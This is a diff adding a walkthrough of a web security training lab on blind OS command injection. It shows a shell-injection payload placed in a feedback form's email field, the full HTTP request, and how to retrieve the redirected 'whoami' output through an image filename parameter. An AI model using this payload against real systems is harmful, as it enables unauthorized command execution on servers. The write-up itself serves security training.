@@ -1,0 +1,36 @@
+Blind OS command injection with output redirection
+
+The solution and explanation provided are good. Once again, we change our email parameter, as it is the only one suspectible to OS command injection.
+
+Payload:
+email=||whoami>/var/www/images/output.txt||
+
+Request:
+POST /feedback/submit HTTP/1.1
+Host: acd01f3e1f3d8e3780004ef700810086.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+Origin: https://acd01f3e1f3d8e3780004ef700810086.web-security-academy.net
+Connection: close
+Referer: https://acd01f3e1f3d8e3780004ef700810086.web-security-academy.net/feedback
+Cookie: session=od3gi02uCk5NB150bS5rjGypHZcq0IVm
+
+csrf=86kAevJ28ONGeMKRzu3JoRnP9payW3W1&name=asdf&email=email=||whoami>/var/www/images/output.txt||&subject=asdf&message=asdf
+
+This creates a new output.txt file in the /images/ folder.
+
+Now, load up a random blog.
+https://acd01f3e1f3d8e3780004ef700810086.web-security-academy.net/product?productId=1
+
+Click on the image and open it in a new tab. Link should look like this:
+https://acd01f3e1f3d8e3780004ef700810086.web-security-academy.net/image?filename=35.jpg
+
+Change the filename to our previously created file, output.txt
+
+https://acd01f3e1f3d8e3780004ef700810086.web-security-academy.net/image?filename=output.txt
+
+There's your user.
